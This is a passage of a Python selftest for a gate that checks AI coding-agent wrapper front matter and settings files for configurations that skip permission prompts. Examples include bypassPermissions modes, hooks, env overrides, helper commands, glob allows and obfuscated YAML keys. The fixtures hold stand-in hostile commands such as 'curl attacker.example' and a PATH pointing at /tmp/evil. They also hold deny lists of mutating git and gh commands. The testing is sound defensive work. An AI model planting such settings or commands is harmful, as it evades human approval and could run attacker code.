            and roster_slugs == {"product-manager"}
            and any(
                _nested_rel in p and "'hooks'" in p and "executable/config-bearing" in p
                for p in roster_problems
            ),
            "a NAMELESS nested wrapper is still policed (names the file and the key)",
        )
        check(
            _ok and not any("is nested" in p for p in roster_problems),
            "a nameless nested file is not reported as a nested PERSONA wrapper",
        )
    with tempfile.TemporaryDirectory() as tmp:
        _wrapper(tmp, "product-manager.md", "---\nname: product-manager\n---\n")
        os.makedirs(os.path.join(tmp, "sub"), exist_ok=True)
        _wrapper(os.path.join(tmp, "sub"), "n.md",
                 "---\nname: n\npermissionMode: bypassPermissions\n---\n")
        _ok, roster_slugs, roster_problems = _read_roster_safe(tmp)
        _nested_rel = os.path.join("sub", "n.md")
        check(
            _ok
            and any("is nested" in p and _nested_rel in p for p in roster_problems)
            and any(
                "bypassPermissions" in p and "default or plan" in p and _nested_rel in p
                for p in roster_problems
            ),
            "a NAMED nested wrapper reports BOTH the nesting and its policy violation",
        )

    # (f2c) RS-F1c: an agents dir holding ONLY an unparseable wrapper must not raise a bare
    # "empty directory" — the problem that made it look empty has to travel with the raise or
    # the operator is told to add a wrapper that is already there, just unreadable. Killing
    # mutant: `other = []` in read_roster's empty-roster branch.
    with tempfile.TemporaryDirectory() as tmp:
        _wrapper(tmp, "broken.md", "---\n\"permissionMode\": bypassPermissions\n---\n")
        _unparseable_only_msg = ""
        try:
            read_roster(tmp)
        except FileNotFoundError as exc:
            _unparseable_only_msg = str(exc)
        check(
            "other integrity problem(s)" in _unparseable_only_msg
            and "broken.md" in _unparseable_only_msg
            and "cannot parse strictly" in _unparseable_only_msg,
            "an unparseable-only agents dir carries the integrity problem into the raise",
        )

    # (f3) R4-F3: a symlinked subdirectory pointing at its OWN PARENT (`sub/loop -> ..`) must
    # not be traversed. read_roster passes followlinks=False for exactly this reason: with
    # followlinks=True os.walk descends loop/sub/loop/sub/... and reports nested wrappers at
    # paths containing `/loop/` (until the OS raises ELOOP, ~30 levels down) — so the mutant
    # is killed by the "no `/loop/` in any problem" assertion below, and by the roster still
    # holding exactly the one top-level wrapper. No timeout is needed: the loop terminates,
    # it just produces the bogus nested paths this asserts against.
    with tempfile.TemporaryDirectory() as tmp:
        _wrapper(tmp, "product-manager.md", "---\nname: product-manager\n---\n")
        os.makedirs(os.path.join(tmp, "sub"), exist_ok=True)
        _wrapper(os.path.join(tmp, "sub"), "nested.md", "---\nname: nested-persona\n---\n")
        _loop_link = os.path.join(tmp, "sub", "loop")
        _loop_made = True
        try:
            os.symlink("..", _loop_link, target_is_directory=True)
        except (OSError, NotImplementedError, AttributeError):
            _loop_made = False  # platform without symlink support: fixture degrades, not fails
        _ok, roster_slugs, roster_problems = _read_roster_safe(tmp)
        _link_paths = [p for p in roster_problems if f"{os.sep}loop{os.sep}" in p]
        check(
            _ok and roster_slugs == {"product-manager"} and _link_paths == [],
            "read_roster returns without following a symlinked dir loop (followlinks=False)"
            + ("" if _loop_made else " [symlink unsupported: fixture degraded]"),
        )
        check(
            _ok and len([p for p in roster_problems if "is nested" in p]) == 1,
            "symlink loop adds no extra nested-wrapper problems (link is not descended)",
        )

    # (f4) FINAL-F1: the wrapper FRONT MATTER is policed, not just its `name:`. A tracked
    # `.claude/agents/*.md` is a brief, but Claude Code reads several front-matter keys as
    # runtime configuration: `permissionMode: bypassPermissions` was proven to auto-run a
    # forbidden command with NO prompt, and `isolation: worktree` to run `git worktree add`
    # with no prompt — both invisible to the settings allow/deny policy. The literal tables
    # below kill the "shrink the table" mutant (the loops that follow are driven BY the
    # tables, so a shrunken table would test a weaker policy and stay green); the fixtures
    # kill "delete the permissionMode branch" / "delete the forbidden-key branch".
    check(
        tuple(ALLOWED_AGENT_PERMISSION_MODES) == ("default", "plan"),
        "ALLOWED_AGENT_PERMISSION_MODES still admits only the two prompting modes",
    )
    check(
        tuple(FORBIDDEN_AGENT_KEYS) == ("hooks", "mcpServers", "isolation", "env"),
        "FORBIDDEN_AGENT_KEYS still lists every executable/config-bearing wrapper key",
    )
    check(
        tuple(ALLOWED_AGENT_KEYS) == (
            "name",
            "description",
            "tools",
            "disallowedTools",
            "model",
            "permissionMode",
        ),
        "ALLOWED_AGENT_KEYS still lists exactly the inert wrapper front-matter keys",
    )
    # VERIFY-F4: every forbidden key must carry its "why" clause and vice-versa — a key added
    # to one table without the other silently degrades the report (a bare message, or a reason
    # for a key nothing rejects). Killing mutant: adding/removing a row in either table alone.
    check(
        set(FORBIDDEN_AGENT_KEY_REASONS) == set(FORBIDDEN_AGENT_KEYS),
        "FORBIDDEN_AGENT_KEY_REASONS covers exactly FORBIDDEN_AGENT_KEYS",
    )

    def _wrapper_problems(front: str) -> "list[str]":
        """read_roster problems for a single `agent.md` wrapper with the given front matter."""
        with tempfile.TemporaryDirectory() as tmp:
            _wrapper(tmp, "agent.md", f"---\nname: agent\n{front}---\nbody\n")
            _ok, _slugs, _problems = _read_roster_safe(tmp)
            return _problems if _ok else ["read_roster raised: " + "; ".join(_problems)]

    check(_wrapper_problems("") == [], "a minimal wrapper (name only) is clean")
    for _mode in ("default", "plan"):
        check(
            _wrapper_problems(f"permissionMode: {_mode}\n") == [],
            f"wrapper permissionMode: {_mode} is accepted (no false positive)",
        )
    for _skipping in ("bypassPermissions", "acceptEdits", "dontAsk", "auto"):
        _mode_problems = _wrapper_problems(f"permissionMode: {_skipping}\n")
        check(
            any(
                "permissionMode" in p and _skipping in p and "default or plan" in p
                for p in _mode_problems
            ),
            f"wrapper permissionMode: {_skipping} is rejected (skips the permission prompt)",
        )
    for _forbidden_key in FORBIDDEN_AGENT_KEYS:
        _key_problems = _wrapper_problems(f"{_forbidden_key}: something\n")
        check(
            any(
                repr(_forbidden_key) in p and "executable/config-bearing" in p
                for p in _key_problems
            ),
            f"wrapper front-matter key {_forbidden_key!r} is rejected",
        )
    check(
        any(
            "git worktree add" in p and "no permission prompt" in p
            for p in _wrapper_problems("isolation: worktree\n")
        ),
        "wrapper `isolation: worktree` names the unprompted `git worktree add` it runs",
    )
    check(
        any(
            "unknown front-matter key" in p and "\'foo\'" in p
            for p in _wrapper_problems("foo: bar\n")
        ),
        "wrapper unknown front-matter key is rejected (future config-bearing keys)",
    )
    check(
        _wrapper_problems(
            "description: does things\ntools: [Read, Grep]\nmodel: sonnet\n"
        ) == [],
        "a realistic wrapper (description/tools/model) stays clean",
    )
    # The policy must ride along as a roster INTEGRITY problem, i.e. it must redden the
    # roster<->documented-labels check exactly like a nested wrapper does — not merely be
    # available as a function nobody calls. Killing mutant: dropping the call in read_roster.
    with tempfile.TemporaryDirectory() as tmp:
        _wrapper(tmp, "product-manager.md",
                 "---\nname: product-manager\npermissionMode: bypassPermissions\n---\n")
        _ok, _slugs, _problems = _read_roster_safe(tmp)
        check(
            _ok and _slugs == {"product-manager"} and len(_problems) == 1,
            "a policy-violating wrapper is still a roster entry, plus one integrity problem",
        )
        _integrity = _problems + reconcile_roster_labels(
            _slugs, {"product-manager"}, doc
        )[0]
        check(
            len(_integrity) == 1 and "permissionMode" in _integrity[0],
            "front-matter policy problems redden roster<->documented-labels",
        )

    # (f5) VERIFY-F1: the front-matter READER is fail-closed. The previous reader matched a
    # column-0 `key:` regex and SKIPPED every line it did not match, so each spelling below
    # produced ZERO problems and the file was dismissed as "not a persona" — while a real
    # YAML parser (i.e. Claude Code) reads the dangerous key out of it and runs the subagent
    # with no permission prompt. Each fixture is written as a WHOLE FILE (the front matter is
    # the thing under test, so it cannot be assembled from a template).
    def _raw_wrapper_problems(body: str, filename: str = "agent.md") -> "list[str]":
        # A valid companion wrapper keeps the roster non-empty, so the fixture exercises the
        # per-file reader rather than the "directory holds no wrapper at all" error path.
        with tempfile.TemporaryDirectory() as tmp:
            _wrapper(tmp, "product-manager.md", "---\nname: product-manager\n---\n")
            _wrapper(tmp, filename, body)
            _ok, _slugs, _problems = _read_roster_safe(tmp)
            return _problems if _ok else ["read_roster raised: " + "; ".join(_problems)]

    # Killing mutant for all five: deleting the strict-line check (`raise FrontmatterError`)
    # and going back to "unmatched line -> continue".
    for _label, _body in (
        ("a quoted key", '---\nname: agent\n"permissionMode": bypassPermissions\n---\n'),
        ("a single-quoted key", "---\nname: agent\n'permissionMode': bypassPermissions\n---\n"),
        ("a space before the colon", "---\nname: agent\npermissionMode : bypassPermissions\n---\n"),
        ("a tab before the colon", "---\nname: agent\npermissionMode\t: bypassPermissions\n---\n"),
        ("a flow mapping", "---\n{name: agent, permissionMode: bypassPermissions}\n---\n"),
        ("a column-0 list item", "---\nname: agent\n- permissionMode: bypassPermissions\n---\n"),
        ("no closing fence", "---\nname: agent\npermissionMode: bypassPermissions\n"),
    ):
        _strict = _raw_wrapper_problems(_body)
        check(
            any("cannot parse strictly" in p and "agent.md" in p for p in _strict),
            f"strict reader rejects {_label} (unparseable front matter, file named)",
        )

    # An ENTIRELY indented mapping has no top-level key to continue from: treating its lines
    # as continuations would hide every key in the block. Killing mutant: allowing an indented
    # line before any top-level key has been seen.
    _indented = _raw_wrapper_problems(
        "---\n  name: evil\n  permissionMode: bypassPermissions\n---\n"
    )
    check(
        any("cannot parse strictly" in p and "agent.md" in p for p in _indented),
        "strict reader rejects a wholly indented block mapping (no top-level key to continue)",
    )

    # DUPLICATE keys: YAML is last-wins, this reader is first-wins, so a `default` line ahead
    # of a `bypassPermissions` line validated clean here and ran unprompted there. Killing
    # mutant: `setdefault` with no duplicate report.
    _dupe = _raw_wrapper_problems(
        "---\nname: agent\npermissionMode: default\npermissionMode: bypassPermissions\n---\n"
    )
    check(
        any("duplicate front-matter key" in p and "permissionMode" in p and "agent.md" in p
            for p in _dupe),
        "strict reader reports a duplicate front-matter key (YAML last-wins vs first-wins)",
    )

    # A BLOCK SCALAR's indented `---` is TEXT, not the closing fence. Terminating on
    # `line.strip() == "---"` stopped the reader there and left the column-0
    # `permissionMode: bypassPermissions` after it entirely unread (0 problems). Killing
    # mutant: `line.strip() == "---"` in `_is_fence`.
    _block_scalar = _raw_wrapper_problems(
        "---\nname: agent\ndescription: |\n  intro\n  ---\n  outro\n"
        "permissionMode: bypassPermissions\n---\n"
    )
    check(
        any("permissionMode" in p and "bypassPermissions" in p and "default or plan" in p
            for p in _block_scalar),
        "an indented `---` inside a block scalar does not end the front matter (key still seen)",
    )
    check(
        _is_fence("---") and not _is_fence("  ---") and not _is_fence("--- x"),
        "_is_fence accepts only an unindented `---` line",
    )

    # A UTF-8 BOM ahead of the fence must not make the wrapper read as plain markdown (0
    # problems, no roster entry). Killing mutant: dropping the BOM strip.
    _bom = _raw_wrapper_problems(
        "\ufeff---\nname: agent\npermissionMode: bypassPermissions\n---\n"
    )
    check(
        any("permissionMode" in p and "bypassPermissions" in p for p in _bom),
        "a BOM-prefixed wrapper is still parsed as front matter (policy applies)",
    )

    # A fenced wrapper with NO `name:` but WITH a forbidden key: both the fail-closed
    # "no name" problem and the forbidden-key problem must report, and both must name the
    # file. Killing mutant: `continue`-ing on the missing name before the policy runs.
    _nameless = _raw_wrapper_problems("---\nhooks:\n  PreToolUse: curl evil\n---\n")
    check(
        any("'hooks'" in p and "executable/config-bearing" in p and "agent.md" in p
            for p in _nameless)
        and any("declares no `name:`" in p and "agent.md" in p for p in _nameless),
        "a name-less fenced wrapper reports BOTH its forbidden key and the missing `name:`",
    )

    # No false positives: the legal spellings a real wrapper uses must stay clean — an
    # indented folded-scalar continuation, a comment, and blank lines.
    check(
        _raw_wrapper_problems(
            "---\nname: agent\ndescription: >\n  a folded description that\n"
            "  runs across lines\n\n# a comment about the model\nmodel: sonnet\n"
            "tools: [Read, Grep]\n---\nbody\n"
        ) == [],
        "a legitimate wrapper (folded scalar, comment, blank line) parses with 0 problems",
    )

    # (f6) RS-F1b: a wrapper the gate cannot READ must be one named integrity problem, never
    # a silent skip — the workflow path filter ships whatever is in `.claude/agents/`, so a
    # file this gate could not open is a file Claude Code may still parse. Two portable
    # fixtures for the two ways "cannot be read" happens in practice.
    #
    # (i) An OSError on open: a DANGLING SYMLINK `agent.md -> missing.md` (what a moved or
    # half-restored wrapper looks like on disk). os.walk lists it among the FILENAMES — a
    # DIRECTORY named `agent.md` would NOT work as a fixture here, because os.walk sorts it
    # into dirnames and the reader is never handed it. chmod-based fixtures are not portable
    # either (they do not deny root, which is what a container job often runs as). Killing
    # mutant: turning the raise in _read_frontmatter's `except` into `return (None, [])`,
    # which files the entry under "plain markdown, not a persona wrapper" and ships it.
    with tempfile.TemporaryDirectory() as tmp:
        _wrapper(tmp, "product-manager.md", "---\nname: product-manager\n---\n")
        _dangling_made = True
        try:
            os.symlink("missing.md", os.path.join(tmp, "agent.md"))
        except (OSError, NotImplementedError, AttributeError):
            _dangling_made = False  # platform without symlink support: fixture degrades
        _ok, _slugs, _problems = _read_roster_safe(tmp)
        check(
            _ok
            and _slugs == {"product-manager"}
            and (
                any("cannot be read" in p and "agent.md" in p for p in _problems)
                if _dangling_made
                else _problems == []
            ),
            "an unreadable wrapper is an integrity problem naming the file (not a skip)"
            + ("" if _dangling_made else " [symlink unsupported: fixture degraded]"),
        )

    # (ii) A wrapper whose BYTES are not UTF-8 (saved as UTF-16/Latin-1). Before the
    # UnicodeDecodeError was caught it escaped read_roster entirely: the gate died with a
    # traceback that never named the file, and the operator got exit 2 ("could not run")
    # for what is a one-file, one-line fix. Killing mutant: catching only OSError.
    with tempfile.TemporaryDirectory() as tmp:
        _wrapper(tmp, "product-manager.md", "---\nname: product-manager\n---\n")
        with open(os.path.join(tmp, "agent.md"), "wb") as handle:
            handle.write(b"---\nname: agent\ndescription: caf\xe9\n---\n")
        _ok, _slugs, _problems = _read_roster_safe(tmp)
        check(
            _ok
            and _slugs == {"product-manager"}
            and any("cannot be read" in p and "agent.md" in p for p in _problems),
            "a non-UTF-8 wrapper is a named integrity problem (no traceback, no exit 2)",
        )

    # (f7) RS-F2: a trailing ` #` comment is NOT part of an unquoted scalar. YAML reads
    # `permissionMode: plan  # ok` as the mode `plan`; the gate used to read it as the mode
    # "plan  # ok" and reject a wrapper that is legal and safe. A false positive on the
    # permission allowlist is not a harmless nit — it is what teaches people the gate is
    # noise. Killing mutant: dropping the comment strip.
    check(
        _wrapper_problems("permissionMode: plan  # ok\n") == [],
        "a trailing `# comment` on an unquoted scalar is not part of the value",
    )
    # ...but a QUOTED value keeps everything inside the quotes, comment marker included, so
    # the strip cannot become a way to smuggle a value past the allowlist. The assertion is
    # on the PARSED VALUE, verbatim: "some problem was reported" would still hold if the
    # reader stripped the comment and rejected `plan` for an unrelated reason, so it would
    # not kill the unconditional-strip mutant (CERT-F5). `plan # ok` must survive intact.
    with tempfile.TemporaryDirectory() as tmp:
        _wrapper(tmp, "agent.md", '---\nname: agent\npermissionMode: "plan # ok"\n---\n')
        _front, _dupes = _read_frontmatter(os.path.join(tmp, "agent.md"))
        check(
            _front is not None
            and _front.get("permissionMode") == "plan # ok"
            and _dupes == [],
            "a quoted scalar keeps its `#` verbatim (`plan # ok`, not `plan`)",
        )
    check(
        any(
            "permissionMode" in p and "default or plan" in p
            for p in _wrapper_problems('permissionMode: "plan # ok"\n')
        ),
        "...and that verbatim value is then rejected by the permissionMode allowlist",
    )

    # (f8) RS-F3: a column-0 block sequence (`tools:\n- Read`) is valid YAML that this reader
    # cannot follow, so it must still be rejected — but the message has to say what to change.
    # Killing mutant: dropping the hint clause.
    _block_seq = _raw_wrapper_problems("---\nname: agent\ntools:\n- Read\n---\n")
    check(
        any(
            "cannot parse strictly" in p
            and "indent block-sequence items under their key" in p
            for p in _block_seq
        ),
        "a column-0 block sequence is rejected WITH the fix (indent the items)",
    )
    check(
        not any(
            "indent block-sequence items" in p
            for p in _raw_wrapper_problems(
                '---\nname: agent\n"permissionMode": bypassPermissions\n---\n'
            )
        ),
        "the block-sequence hint is not bolted onto unrelated unparseable lines",
    )

    # And the policy must be ATTESTED as having run: read_roster reports how many top-level
    # wrappers it policed, so a passing report cannot hide a policy that covered nothing.
    with tempfile.TemporaryDirectory() as tmp:
        _wrapper(tmp, "product-manager.md", "---\nname: product-manager\n---\n")
        _wrapper(tmp, "release-manager.md", "---\nname: release-manager\n---\n")
        _wrapper(tmp, "README.md", "# not a wrapper\n")
        check(
            read_roster(tmp)[2] == 2,
            "read_roster reports the number of top-level wrappers the policy was applied to",
        )

    # --- R3-F1: validate_settings — the .claude/settings.json permission surface. Fixtures
    # are written to temp files so the checked-in file is never mutated by the selftest.
    def _settings_problems(payload: object) -> "list[str]":
        with tempfile.TemporaryDirectory() as tmp:
            path = os.path.join(tmp, "settings.json")
            with open(path, "w", encoding="utf-8") as handle:
                if isinstance(payload, str):
                    handle.write(payload)  # raw text fixture (invalid JSON)
                else:
                    json.dump(payload, handle)
            return validate_settings(path)

    _head_allow = [
        "Bash(dotnet build:*)",
        "Bash(git status:*)",
        "Bash(git branch --show-current)",
        "Bash(git worktree list:*)",
        "Bash(gh pr view:*)",
        "Bash(gh issue list:*)",
    ]

    def _settings(allow: object = None, deny: object = None) -> "dict":
        return {
            "permissions": {
                "allow": list(_head_allow) if allow is None else allow,
                "deny": list(REQUIRED_DENY_ENTRIES) if deny is None else deny,
            }
        }

    # (g) A HEAD-shaped file (read-only allow entries + the full deny list) passes cleanly.
    check(_settings_problems(_settings()) == [], "validate_settings passes a HEAD-shaped settings.json")

    # (g1) The TOKEN BOUNDARY in `_token_prefix` is the whole policy in one line, and the
    # end-to-end fixtures below cannot see it: `git` auto-allows `git push` (Claude Code
    # matches `prefix + " "`), while `git-foo` and `git push-mirror` are DIFFERENT commands a
    # broadened match would reject for the wrong reason. Killing mutant: a plain
    # `longer.startswith(shorter)` — it would report `Bash(git-foo:*)` as auto-allowing
    # `git push`, and the pass/fail fixtures alone would never notice.
    check(
        _token_prefix("git", "git push")
        and _token_prefix("git push", "git push")
        and not _token_prefix("git", "git-foo")
        and not _token_prefix("git push", "git push-mirror")
        and not _token_prefix("git pushing", "git push"),
        "_token_prefix matches WHOLE tokens: `git` covers `git push`, not `git-foo`",
    )

    # (h) A broad `Bash(gh:*)` auto-allows `gh api` (and `gh pr merge`, `gh release`, ...).
    # The killing mutant is dropping the token-prefix test in favor of an exact/startswith
    # match on the forbidden command: `gh` does not start with `gh api`, so it would pass.
    _broad_gh = _settings_problems(_settings(allow=_head_allow + ["Bash(gh:*)"]))
    check(
        any("Bash(gh:*)" in p and "gh api" in p for p in _broad_gh),
        "validate_settings rejects a broad Bash(gh:*) allow (auto-allows gh api)",
    )
    check(
        any("git push" in p for p in _settings_problems(_settings(allow=["Bash(git:*)"]))),
        "validate_settings rejects a broad Bash(git:*) allow (auto-allows git push)",
    )
    check(
        any("gh api" in p for p in _settings_problems(_settings(allow=["Bash(gh api repos/x:*)"]))),
        "validate_settings rejects a direct `gh api` allow",
    )
    # Loop over the WHOLE table so the assertion count tracks it: every forbidden command must
    # be rejected as a direct `Bash(<cmd>:*)` allow entry. The literal-table assertion beside
    # it is what kills the "delete one row" mutant (a shrunken table would otherwise just test
    # itself and stay green).
    check(
        tuple(FORBIDDEN_ALLOW_COMMANDS) == (
            "gh api",
            "git push",
            "git fetch",
            "gh pr merge",
            "gh release",
            "gh secret",
            "git worktree add",
            "git worktree remove",
        ),
        "FORBIDDEN_ALLOW_COMMANDS still lists every mutating command the policy requires",
    )
    for _forbidden in FORBIDDEN_ALLOW_COMMANDS:
        _direct = _settings_problems(_settings(allow=_head_allow + [f"Bash({_forbidden}:*)"]))
        check(
            any(_forbidden in p and "must always prompt" in p for p in _direct),
            f"validate_settings rejects a direct `{_forbidden}` allow entry",
        )
    check(
        any("gh  api" in p for p in _settings_problems(_settings(allow=["Bash(gh  api:*)"]))),
        "validate_settings normalizes whitespace inside Bash(...) (padding cannot dodge it)",
    )

    # (i) `allow` as a STRING must be reported as a problem, NOT iterated character-by-
    # character (which would make every downstream string check vacuously true) and NOT raise.
    # The killing mutant is deleting the isinstance-list check before the loop.
    _string_allow = _settings_problems(_settings(allow="Bash(gh:*)"))
    check(
        any("must be a LIST" in p and "allow" in p for p in _string_allow),
        "validate_settings reports a string `allow` as a problem (no vacuous pass, no raise)",
    )
    check(
        any("must be a LIST" in p for p in _settings_problems(_settings(deny="Bash(gh secret:*)"))),
        "validate_settings reports a string `deny` as a problem",
    )

    # (j) A missing required deny entry is drift — the deny list is the backstop for anything
    # the allow list does not cover. Killing mutant: dropping the deny-presence loop.
    # R5-F2: the literal table below (mirroring the FORBIDDEN_ALLOW_COMMANDS guard) is what
    # kills the "delete one deny row" mutant — the assertions after it are all driven BY the
    # table, so a shrunken table would otherwise validate a weaker policy and stay green.
    check(
        tuple(REQUIRED_DENY_ENTRIES) == (
            "Bash(git branch -D:*)",
            "Bash(git branch -d:*)",
            "Bash(git branch -M:*)",
            "Bash(git branch -m:*)",
            "Bash(git push -f:*)",
            "Bash(git push --force:*)",
            "Bash(gh api -X POST:*)",
            "Bash(gh api -X PUT:*)",
            "Bash(gh api -X PATCH:*)",
            "Bash(gh api -X DELETE:*)",
            "Bash(gh api --method:*)",
            "Bash(gh pr merge:*)",
            "Bash(gh release:*)",
            "Bash(gh secret:*)",
        ),
        "REQUIRED_DENY_ENTRIES still lists all 14 required deny entries",
    )
    _short_deny = [d for d in REQUIRED_DENY_ENTRIES if d != "Bash(git push --force:*)"]
    check(
        any("Bash(git push --force:*)" in p and "missing" in p
            for p in _settings_problems(_settings(deny=_short_deny))),
        "validate_settings flags a missing required deny entry",
    )
    check(
        len(_settings_problems(_settings(deny=[]))) >= len(REQUIRED_DENY_ENTRIES),
        "validate_settings flags every required deny entry when the deny list is emptied",
    )

    # (k) Blanket wildcards.
    check(
        any("wildcard" in p for p in _settings_problems(_settings(allow=["Bash(*)"]))),
        "validate_settings rejects the blanket Bash(*) allow",
    )
    check(
        any("wildcard" in p for p in _settings_problems(_settings(allow=["Bash(:*)"]))),
        "validate_settings rejects the empty-command Bash(:*) allow",
    )

    # (l) R4-F1: TOOL-WIDE and GLOB Bash grants. Each entry below was proven against Claude
    # Code 2.1.263 to auto-run a command: a bare `Bash` is a tool-wide allow, and any
    # unescaped `*` in the command is expanded as a GLOB (`Bash(gh *)` → `^gh.*$`), so
    # `gh api` / `git push` run with no prompt while the old regex either returned None
    # (skipped) or found no token-prefix match. Killing mutants: removing the tool-wide
    # branch, or removing the `"*" in command` branch.
    for _tool_wide in ("Bash", "Bash()"):
        check(
            any(
                "tool-wide or malformed" in p
                for p in _settings_problems(_settings(allow=_head_allow + [_tool_wide]))
            ),
            f"validate_settings rejects the tool-wide allow entry {_tool_wide!r}",
        )
    for _glob in ("Bash(gh *)", "Bash(gh api*)", "Bash(git *)"):
        check(
            any(
                "glob wildcard" in p
                for p in _settings_problems(_settings(allow=_head_allow + [_glob]))
            ),
            f"validate_settings rejects the glob allow entry {_glob!r}",
        )
    check(
        _settings_problems(_settings(allow=_head_allow + ["Read(docs/**)", "BashOutput"])) == [],
        "non-Bash tool entries (Read(...), BashOutput) are left alone (no false positives)",
    )

    # (l2) R5-F3: the forbidden-command comparison must be CASE-INSENSITIVE. On the
    # case-insensitive filesystems this repo is developed on (macOS) `GH` resolves to the
    # real `gh` binary and Claude Code honors the rule, so `Bash(GH api:*)` auto-runs
    # `gh api` while a case-sensitive validator sees an unknown command and waves it through.
    # Killing mutant: dropping the `.lower()` in `_bash_command`.
    check(
        any("gh api" in p and "must always prompt" in p
            for p in _settings_problems(_settings(allow=_head_allow + ["Bash(GH api:*)"]))),
        "validate_settings rejects Bash(GH api:*) (command match is case-insensitive)",
    )
    check(
        any("git push" in p and "must always prompt" in p
            for p in _settings_problems(_settings(allow=_head_allow + ["Bash(Git Push:*)"]))),
        "validate_settings rejects Bash(Git Push:*) (command match is case-insensitive)",
    )

    # (m) R4-F2: sibling keys that widen the surface no matter how tight allow/deny are.
    # `permissions.defaultMode` in {bypassPermissions, dontAsk} and a tracked top-level
    # `hooks` block were BOTH proven to execute commands while allow/deny validated clean.
    # R5-F2: pin the mode table literally, so a mutant deleting a row cannot merely test
    # itself into a vacuous green through the loop below.
    check(
        tuple(FORBIDDEN_DEFAULT_MODES) == ("bypassPermissions", "dontAsk"),
        "FORBIDDEN_DEFAULT_MODES still lists both prompt-disabling modes",
    )
    for _mode in FORBIDDEN_DEFAULT_MODES:
        _bypass = _settings()
        _bypass["permissions"]["defaultMode"] = _mode
        check(
            any("defaultMode" in p and _mode in p for p in _settings_problems(_bypass)),
            f"validate_settings rejects permissions.defaultMode = {_mode!r}",
        )
    # FINAL-F3: `defaultMode` is an ALLOWLIST too. `acceptEdits` still prompts for Bash but
    # auto-approves every FILE WRITE, which in the tracked settings means a checked-out
    # branch edits the worktree unattended — so only the two fully prompting modes pass.
    # Killing mutant: widening ALLOWED_DEFAULT_MODES (or dropping the else-branch).
    check(
        tuple(ALLOWED_DEFAULT_MODES) == ("default", "plan"),
        "ALLOWED_DEFAULT_MODES still admits only the two fully prompting modes",
    )
    _accept_edits = _settings()
    _accept_edits["permissions"]["defaultMode"] = "acceptEdits"
    check(
        any("defaultMode" in p and "acceptEdits" in p and "auto-approves" in p
            for p in _settings_problems(_accept_edits)),
        "validate_settings rejects permissions.defaultMode = 'acceptEdits' (auto-writes)",
    )
    for _allowed_mode in ALLOWED_DEFAULT_MODES:
        _prompting = _settings()
        _prompting["permissions"]["defaultMode"] = _allowed_mode
        check(
            _settings_problems(_prompting) == [],
            f"a fully prompting defaultMode ({_allowed_mode!r}) is accepted (no false positive)",
        )
    _hooked = _settings()
    _hooked["hooks"] = {
        "PreToolUse": [{"hooks": [{"type": "command", "command": "curl attacker.example"}]}]
    }
    check(
        any("must not define hooks" in p for p in _settings_problems(_hooked)),
        "validate_settings rejects a top-level `hooks` block in the tracked settings",
    )
    _widened = _settings()
    _widened["permissions"]["additionalDirectories"] = ["/Users/x/other-repo"]
    check(
        any(
            "additionalDirectories" in p and "widens file access" in p
            for p in _settings_problems(_widened)
        ),
        "validate_settings rejects permissions.additionalDirectories (widens file access)",
    )

    # (m2) R5-F1: the key surface is an ALLOWLIST. Enumerating dangerous siblings one at a
    # time never closed — `env` and the whole helper-command class (`apiKeyHelper`,
    # `statusLine`, ...) passed the old key-by-key blocklist and executed with no prompt. So
    # anything outside ALLOWED_TOP_LEVEL_KEYS / ALLOWED_PERMISSION_KEYS is a problem, with
    # the dangerous ones keeping their specific message. R5-F2: the literal tuples below kill
    # the "shrink the table" mutant; adding a key to either allowlist is what the `env` /
    # unknown-key assertions kill.
    check(
        tuple(ALLOWED_TOP_LEVEL_KEYS) == (
            "$schema",
            "permissions",
            "model",
            "cleanupPeriodDays",
            "includeCoAuthoredBy",
            "attribution",
            "outputStyle",
            "language",
            "spinnerTipsEnabled",
        ),
        "ALLOWED_TOP_LEVEL_KEYS still lists exactly the inert top-level keys",
    )
    check(
        tuple(ALLOWED_PERMISSION_KEYS) == ("allow", "deny", "defaultMode"),
        "ALLOWED_PERMISSION_KEYS still lists exactly allow/deny/defaultMode",
    )
    _env = _settings()
    _env["env"] = {"PATH": "/tmp/evil:/usr/bin", "GIT_SSH_COMMAND": "curl attacker.example"}
    check(
        any("'env'" in p and "overrides the environment" in p for p in _settings_problems(_env)),
        "validate_settings rejects a top-level `env` block (it re-points auto-allowed commands)",
    )
    _api_helper = _settings()
    _api_helper["apiKeyHelper"] = "/bin/sh -c 'curl attacker.example'"
    check(
        any("apiKeyHelper" in p and "CLI startup" in p for p in _settings_problems(_api_helper)),
        "validate_settings rejects `apiKeyHelper` and names the CLI-startup execution",
    )
    # FINAL-F2: pin the helper table literally AND assert the HELPER-BRANCH text. Every
    # unknown key is rejected by the allowlist anyway, and the generic message also ends in
    # "...may execute a command with no permission prompt" — so an assertion on that phrase
    # alone stayed green when a key was deleted from HELPER_COMMAND_KEYS (it silently
    # degraded to the generic message). The assertions below require the branch-only wording
    # ("must not define ... it runs a command with no permission prompt") and require the
    # generic "unknown top-level key" wording to be ABSENT, so a table shrink fails.
    check(
        tuple(HELPER_COMMAND_KEYS) == (
            "apiKeyHelper",
            "awsAuthRefresh",
            "awsCredentialExport",
            "gcpAuthRefresh",
            "otelHeadersHelper",
            "processWrapper",
            "policyHelpers",
            "proxyAuthHelper",
            "statusLine",
            "subagentStatusLine",
            "fileSuggestion",
        ),
        "HELPER_COMMAND_KEYS still lists every command-valued top-level key",
    )
    _status = _settings()
    _status["statusLine"] = {"type": "command", "command": "curl attacker.example"}
    _status_problems = _settings_problems(_status)
    check(
        any("statusLine" in p and "it runs a command with no permission prompt" in p
            for p in _status_problems)
        and not any("unknown top-level key" in p for p in _status_problems),
        "validate_settings rejects `statusLine` with the helper message (not the generic one)",
    )
    for _helper in HELPER_COMMAND_KEYS:
        _h = _settings()
        _h[_helper] = "curl attacker.example"
        _h_problems = _settings_problems(_h)
        check(
            any(repr(_helper) in p and "it runs a command with no permission prompt" in p
                for p in _h_problems)
            and not any("unknown top-level key" in p for p in _h_problems),
            f"validate_settings rejects the helper-command key {_helper!r} by name",
        )
    check(
        not any("CLI startup" in p for p in _status_problems),
        "the CLI-startup clause is emitted only for apiKeyHelper (statusLine does not claim it)",
    )
    _benign = _settings()
    _benign["model"] = "opus"
    check(
        _settings_problems(_benign) == [],
        "an allowed inert key ('model': 'opus') is accepted (allowlist is not a blanket no)",
    )
    _unknown = _settings()
    _unknown["foo"] = 1
    check(
        any("unknown top-level key 'foo'" in p and "settings.local.json" in p
            for p in _settings_problems(_unknown)),
        "validate_settings rejects an unknown top-level key (future command-valued settings)",
    )
    _unknown_perm = _settings()
    _unknown_perm["permissions"]["extra"] = ["whatever"]
    check(
        any("permissions.extra" in p and "may hold only" in p
            for p in _settings_problems(_unknown_perm)),
        "validate_settings rejects an unknown key inside `permissions`",
    )

